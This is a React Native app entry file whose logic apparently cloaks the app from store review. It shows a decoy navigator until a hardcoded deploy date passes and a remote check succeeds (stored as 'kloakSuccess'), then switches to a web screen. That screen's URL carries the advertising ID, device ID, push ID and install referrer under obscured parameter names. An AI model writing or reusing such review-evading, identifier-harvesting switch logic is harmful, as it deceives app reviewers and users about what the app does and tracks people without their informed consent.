import React from 'react';
// import {StatusBar} from 'react-native';
import AppNavigator, {RootStackParamList} from './src/navigation/AppNavigator';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import {useEffect, useState, useCallback, useMemo} from 'react';
import {
  INITIAL_URL,
  URL_IDENTIFAIRE,
  ONE_SIGNAL_ID,
} from './config/credentials';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import {OneSignal, LogLevel} from 'react-native-onesignal';
import {PlayInstallReferrer} from 'react-native-play-install-referrer';
import {handleGetAaid} from './config/getAaid';
import {generateTimestampUserId} from './config/utils';
import CustomeWelcome from './src/Target/CustomeWelcome';
import TargetScreen from './src/Target/TargetScreen';

const FAIL_FETCH_URL = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`;

//  UPDATE BEFORE DEPLOY
const targetData = new Date('2025-07-01T12:00:00Z');
const currentDate = new Date();

const isWasAppVisited = async () => {
  console.log('START VISITING CHECK');
  try {
    const visitCheck = await AsyncStorage.getItem('hasVisitedBefore');
    return visitCheck === 'true';
  } catch (error) {
    console.error(error);
    return false;
  }
};

const Stack = createNativeStackNavigator<RootStackParamList>();

function App(): React.JSX.Element {
  // screen rendering
  const [isWelcomeComplete, setIsWelcomeComplete] = useState(false);
  // OneSignal
  const [oneSignalUserId, setOneSignalUserId] = useState<string>('');
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  // First Visit check
  const [timeStamp, setTimeStamp] = useState('');
  const [isFirstVisit, setIsFirstVisit] = useState<boolean | null>(null);
  // isReadyToVisitHandler
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  // AppsFlyer
  const [idfv, setIdfv] = useState<string>('');
  const [aaid, setAaid] = useState<string>('');

  // Push notifications
  const [openWithPush, setOpenWithPush] = useState(false);

  const [finalProductUrl, setFinalProductUrl] = useState<string | null>(null);
  const [isConversionDataReceived, setIsConversionDataReceived] =
    useState(false);
  const [isAppsFlyerReady, setIsAppsFlyerReady] = useState(false);
  const [referrer, setReferrer] = useState<string>('');

  useEffect(() => {
    const initializeApp = async () => {
      console.log('🚀 Starting app initialization...');
      try {
        console.log('📱 Initializing OneSignal...');
        await initOneSignal();

        console.log('🔗 Getting deep link...');
        await getDeepLink();

        console.log('👤 Checking first visit...');
        await checkFirstVisit();

        console.log('🌐 Checking if ready to visit...');
        await isReadyToVisitHandler();

        console.log(' 📱 get Device ID');
        await getDeviceId();

        console.log('📱 get AAID');
        await getAaid();

        console.log('📱 get required data');
        await getRequiredData();

        console.log('📊 Initializing AppsFlyer...');
        // console.log('CHECK IS WAS VISITED BEFORE!!', visitedBefore);
        await initAppsFlyer();

        console.log('✅ App initialization sequence completed');
      } catch (error) {
        console.log('❌ Error during app initialization:', error);
      }
    };
    initializeApp();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const getReferrer = useCallback(async () => {
    return new Promise<string | null>((resolve, reject) => {
      PlayInstallReferrer.getInstallReferrerInfo((info, error) => {
        if (!error) {
          // console.log(info);
          // Get raw referrer string without any decoding
          const installReferrer = info?.installReferrer;
          // console.log('Raw referrer info:', info);
          // console.log('Raw referrer string:', installReferrer);

          if (installReferrer) {
            // Try to preserve the raw string exactly as received
            setReferrer(installReferrer);
            resolve(installReferrer);

            console.log('THIS IS REFERRER', installReferrer);
          }
        } else {
          console.log('Error getting referrer:', error);
          reject(new Error('error accured'));
        }
      });
    });
  }, []);

  const initOneSignal = useCallback(async () => {
    console.log('initOneSignal');
    OneSignal.Debug.setLogLevel(LogLevel.Verbose);
    // OneSignal Initialization
    OneSignal.initialize(ONE_SIGNAL_ID);
    try {
      // Request permission and get user ID
      const permissionResult = await OneSignal.Notifications.requestPermission(
        true,
      );

      setOneSignalPermissionStatus(permissionResult);
      console.log('OneSignal permission result:', permissionResult);

      // if (permissionResult) {
      const userId = await OneSignal.User.getOnesignalId();
      console.log('OneSignal: user id:', userId);

      if (userId) {
        setOneSignalUserId(userId);
        await AsyncStorage.setItem('oneSignalUserId', userId);
        // console.log(userId);
        // setIsOneSignalReady(true);
      } else {
        // setIsOneSignalReady(true);
        return;
        // console.log('get sequent permision');
        // // If no userId, set up a listener for when it becomes available
        // const userStateChangedListener = OneSignal.User.addEventListener(
        //   'change',
        //   async event => {
        //     console.log(event);
        //     const newUserId = await OneSignal.User.getOnesignalId();
        //     if (newUserId) {
        //       // console.log('OneSignal: got delayed user id:', newUserId);
        //       setOneSignalUserId(newUserId);
        //       await AsyncStorage.setItem('oneSignalUserId', newUserId);
        //       setIsOneSignalReady(true);
        //       userStateChangedListener.remove();
        //     }
        //   },
        // );
      }
      // }
    } catch (error) {
      console.error('Error initializing OneSignal:', error);
      // Fallback: try to get stored userId
      const storedUserId = await AsyncStorage.getItem('oneSignalUserId');
      if (storedUserId) {
        setOneSignalUserId(storedUserId);
        // setIsOneSignalReady(true);
      }
    }
  }, []);

  const getDeepLink = useCallback(async () => {
    console.log('get Deep Link');
    try {
      // await FBDeepLink.initialize(FB_APP_ID, FB_CLIENT_TOKEN);
      // const deepLink = await FBDeepLink.getDeepLink();
      const FUCK_DEEPLINK = 'deeplinktest://approved?fb_test_00';
      const parseDeepArray = FUCK_DEEPLINK.split('?')[1];
      await AsyncStorage.setItem('isDeeplinkExist', 'false');
      await AsyncStorage.setItem('deepLinkData', parseDeepArray);
      // setDeepLinkData(FUCK_DEEPLINK);
      return Promise.resolve(false);

      // if (
      //   deepLink &&
      //   deepLink.length > 0 &&
      //   deepLink.split('?')[1].includes('_')
      // ) {
      //   console.log('YES deepLink', deepLink);
      //   const parseDeepArray = deepLink.split('?')[1];
      //   console.log(parseDeepArray);
      //   await AsyncStorage.setItem('isDeeplinkExist', 'true');
      //   await AsyncStorage.setItem('deepLinkData', parseDeepArray);
      //   setDeepLinkData(parseDeepArray);
      //   setIsDeepLink(true);
      // } else {
      //   console.log('NO deeplink', deepLink);
      // }
    } catch (error) {
      console.error('Deep link initialization error:', error);
    }
  }, []);

  const checkFirstVisit = useCallback(async () => {
    console.log('SECOND FUNCTION');
    try {
      console.log('checkFirstVisit');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      console.log('hasVisited from AsyncStorage:', hasVisited);

      // Get stored timestamp_user_id first
      let storedTimeStamp = await AsyncStorage.getItem('timeStamp');
      if (!storedTimeStamp) {
        // Generate new timestamp_user_id only if none exists
        storedTimeStamp = generateTimestampUserId();
        await AsyncStorage.setItem('timeStamp', storedTimeStamp);
        console.log('Generated new timestamp_user_id:', storedTimeStamp);
      } else {
        console.log('Retrieved stored timestamp_user_id:', storedTimeStamp);
      }

      // Set timestamp to use in app
      setTimeStamp(storedTimeStamp);

      if (!hasVisited) {
        console.log('hasVisited', hasVisited);
        console.log('FIRST app visit - setting isFirstVisit to true');
        setIsFirstVisit(true);

        OneSignal.User.addTag('timestamp_user_id', storedTimeStamp);
        OneSignal.login(storedTimeStamp);
        console.log('SEND TIME STAMP TO - OneSignal.login()');
      } else {
        console.log('NOT FIRST app visit - setting isFirstVisit to false');
        // Returning user
        // ! RETRIEVE APP & DEEPLINK STORED DATA
        // retrieveStoredData();
        setIsFirstVisit(false);
      }
    } catch (error) {
      console.error('Error checking first visit:', error);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const isReadyToVisitHandler = useCallback(async () => {
    console.log('THIRD FUNCTION');

    try {
      console.log('isReadyToVisitHandler check kload,hasVisited..');
      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
      const hasVisited = await isWasAppVisited();
      console.log('CHECK FIRST VISIT FN', hasVisited);
      // const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
      console.log('hasVisited', hasVisited);
      console.log('kloakSuccess', kloakSuccess);

      if (currentDate >= targetData) {
        console.log('currentDate >= targetData- WebView will be opened');
        if (hasVisited && kloakSuccess) {
          setIsReadyToVisit(true);
          // setVisitedBefore(true);
        }
        if (!hasVisited) {
          console.log('First visit - checking URL');
          // Don't set hasVisitedBefore here - wait for AppsFlyer conversion data

          try {
            const response = await fetch(visitUrl);

            console.log('URL status:', response.status);
            console.log('visitUrl', visitUrl);

            if (response.status === 404) {
              console.log('❌ URL status:', response.status);
            } else {
              console.log('✅ URL status:', response.status);
            }

            if (response.status === 200) {
              await AsyncStorage.setItem('kloakSuccess', 'true');

              if (currentDate >= targetData) {
                setIsReadyToVisit(true);
                console.log('Current date passed target date, ready to visit');
              } else {
                // setIsReadyToVisit(false);
                console.log('Current date has not passed target date');
              }
            }
            //  else {
            //   setIsReadyToVisit(false);
            // }
          } catch (error) {
            console.log('❌ URL fetch error:', error);
            // setIsReadyToVisit(false);
          }
        }
      } else {
        console.log('currentDate < targetData- WebView will not open');
        // setIsReadyToVisit(false);
      }
    } catch (error) {
      console.log('Error in isReadyToVisitHandler:', error);
      // setIsReadyToVisit(false);
    }
  }, []);

  const getAaid = useCallback(async () => {
    try {
      handleGetAaid().then(aaid => {
        console.log('RECEIVED AAID');
        if (aaid) {
          setAaid(aaid);
        }
      });
    } catch (error) {}
  }, []);

  const getDeviceId = useCallback(async () => {
    try {
      DeviceInfo.getUniqueId()
        .then(deviceId => {
          console.log('Device id-', deviceId);
          setIdfv(deviceId);
        })
        .catch(error => {
          console.error('Error in device info:', error);
          // Set defaults to allow app to continue
          setIdfv('unknown-device');
          // Resolve even if device info fails
          // resolve();
        });
    } catch (erorr) {
      console.log('Device Info fn error', erorr);
    }
  }, []);

  const getRequiredData = useCallback(async () => {
    try {
      console.log('required data');
      console.log('get REFERRER');
      const currentReferrer = await getReferrer();
      if (currentReferrer) {
        setReferrer(currentReferrer);
      }
      console.log('AFTER GET REFERRER');
    } catch (error) {
      console.error('error', error);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const initAppsFlyer = useCallback(() => {
    return new Promise<void>(resolve => {
      console.log('initAppsFlyer');

      setIsConversionDataReceived(true);
      setIsAppsFlyerReady(true);
      // fakeInstallApps();
      resolve();
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Modify the handleNotificationClick function
  const handleNotificationClick = useCallback(async (event: any) => {
    const timeStampRetrieved = await AsyncStorage.getItem('timeStamp');
    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    let finalUrl;

    try {
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');

      if (event.notification.launchURL) {
        // Log full event object to understand OneSignal's behavior
        console.log('Full notification event:', JSON.stringify(event, null, 2));

        finalUrl = `${baseUrl}?event=push_open_browser&timestamp_user_id=${timeStampRetrieved}`;
        console.log('Tracking URL:', finalUrl);

        // Only make the tracking request
        await fetch(finalUrl);
        setOpenWithPush(true);
      } else {
        // console.log('Regular push_open_webview case', event);
        finalUrl = `${baseUrl}?event=push_open_webview&timestamp_user_id=${timeStampRetrieved}`;
        setOpenWithPush(true);
        // await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));

        if (!hasVisited) {
          await AsyncStorage.setItem('hasVisitedBefore', 'true');
          console.log('Marked as visited for the first time');
        }

        await fetch(finalUrl);
      }
    } catch (error) {
      console.error('🔔 Error handling notification:', error);
    }
  }, []);

  // Add back the notification setup
  useEffect(() => {
    // const setupNotifications = async () => {
    const onClick = (event: any) => {
      handleNotificationClick(event);
    };

    try {
      OneSignal.Notifications.addEventListener('click', onClick);
    } catch (error) {
      console.error('🔔 Error setting up notifications:', error);
    }

    return () => {
      try {
        OneSignal.Notifications.removeEventListener('click', onClick);
      } catch (error) {}
    };
  }, [handleNotificationClick]);

  const isReadyForTestScreen = useMemo(() => {
    // Basic requirements for all launches
    // console.log('isReadyForTestScreen fn ');
    // console.log('isReadyToVisit', isReadyToVisit);
    const baseRequirements = isReadyToVisit;
    // console.log('baseRequirements', baseRequirements);
    if (isFirstVisit) {
      // console.log('baseRequirements', baseRequirements);
      return baseRequirements;
    }
    // For subsequent launches, only need base requirements
    // console.log('IS APP READY FOR PRODUCT TO BE OPENE', baseRequirements);
    // console.log('baseRequirements', baseRequirements);
    return baseRequirements;
  }, [isReadyToVisit, isFirstVisit]);

  const constructUrl = () => {
    console.log('🚀 CONSTRUCT URL - AppsFlyer is ready, building final URL');

    // Validate that we have the minimum required data
    if (!timeStamp) {
      console.log('❌ Missing required data for URL construction:', {
        timeStamp,
        idfv,
      });
      return null;
    }

    const sumDataSub20 = {
      // appsResponse: appsResponse,
      // deepLink: deepLinkData ?? '',
      referrer: referrer,
    };

    console.log('SUB 20 DATA-', sumDataSub20);

    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`;
    const params = new URLSearchParams();

    // const JSONreferrer = JSON.stringify(referrer);
    // const encriptedReferrer = encodeURIComponent(JSONreferrer);
    const initialEncriptedReferrer = encodeURIComponent(referrer);

    // Add common parameters that are always needed
    console.log('referrer ', initialEncriptedReferrer);
    params.append('idfa', aaid);
    params.append('oneSignalId', oneSignalUserId);
    params.append('idfv', idfv);
    // params.append('uid', applsFlyerUID);
    params.append('customerUserId', referrer);
    // params.append('timestamp_user_id', timeStamp);
    params.append('jthrhg', timeStamp);
    // params.append(
    //   'sub_id_20',
    //   encodeURIComponent(JSON.stringify( sumDataSub20)),
    // );

    // params.append(
    //   'sub_id_20',
    //   `EXPECTED_DEEP_LINK:${deepLinkData}||APPSFLYER:|${nonOrganicApps}||REFERRER:${referrer}`,
    // );

    params.append('sub_id_20', initialEncriptedReferrer);

    // Handle non-organic parameters based on whether it's first visit or not
    if (isFirstVisit) {
      console.log('🔵 FIRST VISIT ');
    } else {
      console.log('🟡 SUBSEQUENT VISIT ');
    }

    let productUrl = `${baseUrl}&${params.toString()}`;
    // console.log(productUrl);

    // console.log('opened with push', openWithPush);
    if (openWithPush) {
      productUrl += '&yhugh=true';
      // console.log('Adding push notification parameter to URL', productUrl);
    }

    console.log('✅ FINAL Constructed URL:', productUrl);

    return productUrl;
  };

  // Add separate useEffect to call constructUrl and set state
  useEffect(() => {
    console.log('🔄 useEffect triggered with:', {
      isAppsFlyerReady,
      isConversionDataReceived,
      isFirstVisit,
    });

    // Step 1: Wait for AppsFlyer to be fully ready
    if (!isAppsFlyerReady) {
      console.log('⏳ Step 1: Waiting for AppsFlyer to be ready...');
      return;
    }
    console.log('✅ Step 1: AppsFlyer is ready');

    // Step 2: For first visits, also wait for conversion data
    console.log('🔍 Step 2: Checking conversion data requirement...');
    console.log('   - isFirstVisit:', isFirstVisit);
    console.log('   - isConversionDataReceived:', isConversionDataReceived);
    console.log(
      '   - Condition (isFirstVisit && !isConversionDataReceived):',
      isFirstVisit && !isConversionDataReceived,
    );

    if (isFirstVisit && !isConversionDataReceived) {
      console.log('⏳ Step 2: Waiting for conversion data (first visit)...');
      return;
    }
    console.log(
      '✅ Step 2: Conversion data check passed (returning user or data received)',
    );

    console.log('isConversionDataReceived -', isConversionDataReceived);
    // Step 3: Now we can safely build the URL
    console.log('🚀 Step 3: All conditions met - calling constructUrl...');
    const url = constructUrl();
    if (url) {
      // console.log('✅ URL built successfully:', url);
      setFinalProductUrl(url);
      console.log('isConversionDataReceived -', isConversionDataReceived);
      // Only close welcome screen after URL is successfully built
      setTimeout(() => {
        console.log('TIMER 10 SEC IS OUT');
        setIsWelcomeComplete(true);
      }, 6000);

      console.log('TARGET SCREEN OPEN');
    } else {
      console.log('❌ Failed to build URL - missing required data');
      // Use fallback URL immediately when construction fails
      console.log('🔄 Using fallback URL:', FAIL_FETCH_URL);
      setFinalProductUrl(FAIL_FETCH_URL);

      // Still wait 10 seconds to match the success case timing
      setTimeout(() => {
        console.log('TIMER 10 SEC IS OUT (FALLBACK),CONSTRUCT URL FAIL ❌ ');
        setIsWelcomeComplete(true);
      }, 20000);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isAppsFlyerReady, isConversionDataReceived, isFirstVisit]);

  return (
    <NavigationContainer>
      {/* <StatusBar barStyle="dark-content" backgroundColor="#fff" /> */}
      {/* <AppNavigator /> */}
      <Stack.Navigator screenOptions={{headerShown: false}}>
        {!isWelcomeComplete ? (
          <>
            <Stack.Screen name="CustomeWelcome" component={CustomeWelcome} />
          </>
        ) : isReadyForTestScreen ? (
          <>
            <Stack.Screen
              name="TargetScreen"
              component={TargetScreen}
              initialParams={{
                isFirstVisit,
                timeStamp,
                url: finalProductUrl,
                oneSignalPermissionStatus,
              }}
            />
          </>
        ) : (
          <>
            <Stack.Screen name="AppNavigator" component={AppNavigator} />
          </>
        )}
      </Stack.Navigator>
    </NavigationContainer>
  );
}

export default App;
